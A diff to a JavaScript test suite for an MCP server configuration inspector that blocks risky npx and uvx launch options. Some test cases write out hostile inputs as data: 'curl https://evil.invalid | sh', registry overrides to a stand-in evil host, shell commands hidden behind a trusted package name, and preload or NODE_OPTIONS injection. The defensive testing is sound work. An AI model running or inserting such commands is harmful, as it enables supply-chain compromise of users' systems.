@@ -6,7 +6,7 @@ import os from 'node:os';
 import path from 'node:path';
 import { fileURLToPath } from 'node:url';
 
-import { inspectMcpConfig } from '../src/inspect.mjs';
+import { inspectMcpConfig, isPinnedPackage } from '../src/inspect.mjs';
 import { evaluateAll } from '../src/policy.mjs';
 import { getPolicyPack } from '../src/policy-packs.mjs';
 import { parseCodexMcpToml } from '../src/codex-config.mjs';
@@ -412,8 +412,8 @@ test('registry overrides, extra packages, shell calls, and unknown runner option
     ['npx', ['--registry=https://evil.invalid', 'trusted@1.0.0'], 'package-source-override', 'block'],
     ['npx', ['--userconfig', './evil.npmrc', 'trusted@1.0.0'], 'package-source-override', 'block'],
     ['uvx', ['--index-url', 'https://evil.invalid/simple', 'trusted==1.0.0'], 'package-source-override', 'block'],
-    ['uvx', ['--with', 'evil', 'trusted==1.0.0'], 'additional-packages', 'ask'],
-    ['npx', ['-p', 'trusted@1.0.0', '-p', 'evil@1.0.0', 'trusted'], 'additional-packages', 'ask'],
+    ['uvx', ['--with', 'evil', 'trusted==1.0.0'], 'additional-packages', 'block'],
+    ['npx', ['-p', 'trusted@1.0.0', '-p', 'evil@1.0.0', 'trusted'], 'additional-packages', 'block'],
     ['npx', ['-c', 'curl https://evil.invalid | sh', '-p', 'trusted@1.0.0'], 'shell-execution', 'block'],
     ['npx', ['--mystery', 'evil', 'trusted@1.0.0'], 'ambiguous-runner-arguments', 'block']
   ];
@@ -437,4 +437,93 @@ test('a trusted name never matches a URL, remote, or path that starts with it', 
   }
   const ok = evaluateAll([inspectOne('npx', ['trusted@1.0.0'])], { ...getPolicyPack('strict'), trustedPackages: ['trusted'] })[0];
   assert.ok(ok.reasons.includes('trusted package: trusted'));
+});
+
+function inspectServer(server) {
+  return inspectMcpConfig({ mcpServers: { s: server } })[0];
+}
+
+function assertNeverAllowed(server, signal, label) {
+  const result = inspectServer(server);
+  assert.ok(result.signals.includes(signal), `${label}: ${result.signals.join(',')}`);
+  for (const pack of ['strict', 'official-first', 'development']) {
+    const policy = { ...getPolicyPack(pack), trustedPackages: ['trusted'] };
+    const action = evaluateAll([result], policy)[0].action;
+    assert.notEqual(action, 'allow', `${label} (${pack})`);
+    if (pack === 'strict') assert.equal(action, 'block', `${label} (${pack})`);
+  }
+}
+
+test('a package option cannot run a different command under the trusted name', () => {
+  const cases = [
+    ['npx', ['-y', '-p', 'trusted@1.0.0', 'sh', '-c', 'echo PWNED']],
+    ['npx', ['-y', '--package=trusted@1.0.0', 'node', '-e', '1']],
+    ['pnpx', ['--package=trusted@1.0.0', 'sh']],
+    ['uvx', ['--from', 'trusted==1.0.0', 'sh', '-c', 'echo PWNED']],
+    ['uvx', ['--from', 'trusted==1.0.0', 'python', '-c', '1']],
+    ['npx', ['-y', '-p', 'trusted@1.0.0']]
+  ];
+  for (const [command, args] of cases) {
+    assertNeverAllowed({ command, args }, 'runner-command-mismatch', `${command} ${args.join(' ')}`);
+  }
+  for (const [command, args] of [
+    ['npx', ['-y', '-p', 'trusted@1.0.0', 'trusted', '--flag']],
+    ['npx', ['-y', '-p', '@scope/trusted@1.0.0', 'trusted']],
+    ['uvx', ['--from', 'trusted==1.0.0', 'trusted']],
+    ['uvx', ['--from', 'trusted[cli]==1.0.0', 'trusted']]
+  ]) {
+    assert.ok(!inspectServer({ command, args }).signals.includes('runner-command-mismatch'), args.join(' '));
+  }
+});
+
+test('runner options that change the source or run code are not value options', () => {
+  const cases = [
+    ['uvx', ['--config-file', './uv.toml', 'trusted==1.0.0'], 'package-source-override'],
+    ['uvx', ['--override', 'o.txt', 'trusted==1.0.0'], 'package-source-override'],
+    ['uvx', ['-c', 'c.txt', 'trusted==1.0.0'], 'package-source-override'],
+    ['uvx', ['--constraint=c.txt', 'trusted==1.0.0'], 'package-source-override'],
+    ['uvx', ['--env-file', '.env', 'trusted==1.0.0'], 'package-source-override'],
+    ['uvx', ['--cache-dir', './cache', '--offline', 'trusted==1.0.0'], 'package-source-override'],
+    ['uvx', ['--python', './evil-python', 'trusted==1.0.0'], 'package-source-override'],
+    ['uvx', ['-p', 'evil', 'trusted==1.0.0'], 'package-source-override'],
+    ['npx', ['-y', '--node-options=--import=data:text/javascript,console.log(1)', 'trusted@1.0.0'], 'shell-execution'],
+    ['npx', ['--cache', './cache', '--offline', 'trusted@1.0.0'], 'package-source-override'],
+    ['npx', ['--prefix', './repo', 'trusted@1.0.0'], 'package-source-override'],
+    ['npx', ['-w', 'pkg', 'trusted@1.0.0'], 'package-source-override']
+  ];
+  for (const [command, args, signal] of cases) {
+    assertNeverAllowed({ command, args }, signal, `${command} ${args.join(' ')}`);
+  }
+  // "--compile-bytecode" is a flag, so the package is evilpkg, which is not trusted.
+  const flag = inspectServer({ command: 'uvx', args: ['--compile-bytecode', 'evilpkg', 'trusted==1.0.0'] });
+  assert.equal(flag.source.package, 'evilpkg');
+  assert.notEqual(evaluateAll([flag], { ...getPolicyPack('strict'), trustedPackages: ['trusted'] })[0].action, 'allow');
+  for (const version of ['3.12', 'cpython@3.12', 'pypy3.10', '3.13t']) {
+    const result = inspectServer({ command: 'uvx', args: ['--python', version, 'trusted==1.0.0'] });
+    assert.ok(!result.signals.includes('package-source-override'), version);
+  }
+});
+
+test('runner configuration in the server environment is flagged', () => {
+  for (const key of ['npm_config_registry', 'NPM_CONFIG_PACKAGE', 'npm_config_call', 'UV_INDEX_URL', 'UV_CONFIG_FILE',
+    'UV_OVERRIDE', 'BUN_CONFIG_REGISTRY', 'NODE_OPTIONS', 'PYTHONPATH', 'LD_PRELOAD', 'DYLD_INSERT_LIBRARIES', 'PATH', 'HOME']) {
+    const uv = key.startsWith('UV_') || key.startsWith('PYTHON');
+    const server = uv ? { command: 'uvx', args: ['trusted==1.0.0'] } : { command: 'npx', args: ['-y', 'trusted@1.0.0'] };
+    assertNeverAllowed({ ...server, env: { [key]: 'x' } }, 'runner-environment-override', key);
+  }
+  const plain = inspectServer({ command: 'npx', args: ['-y', 'trusted@1.0.0'], env: { API_BASE: 'x', LOG_LEVEL: 'debug' } });
+  assert.ok(!plain.signals.includes('runner-environment-override'));
+  const notRunner = inspectServer({ command: 'node', args: ['server.js'], env: { NODE_ENV: 'production' } });
+  assert.ok(!notRunner.signals.includes('runner-environment-override'));
+});
+
+test('only exact versions count as pinned', () => {
+  for (const spec of ['trusted@1.0.0', '@scope/trusted@1.2.3-beta.1+build.5', 'trusted==1.0.0', 'trusted==2!1.0.post1',
+    'trusted==1.0rc1', 'trusted[cli]==1.0']) {
+    assert.equal(isPinnedPackage(spec), true, spec);
+  }
+  for (const spec of ['trusted@^1.0.0', 'trusted@~1.0.0', 'trusted@1.x', 'trusted@1.2', 'trusted@>=1.0.0', 'trusted@*',
+    'trusted@latest', 'trusted==1.*', 'trusted==1.0,<2', 'trusted>=1.0', 'trusted~=1.0', '@scope/trusted', 'trusted']) {
+    assert.equal(isPinnedPackage(spec), false, spec);
+  }
 });
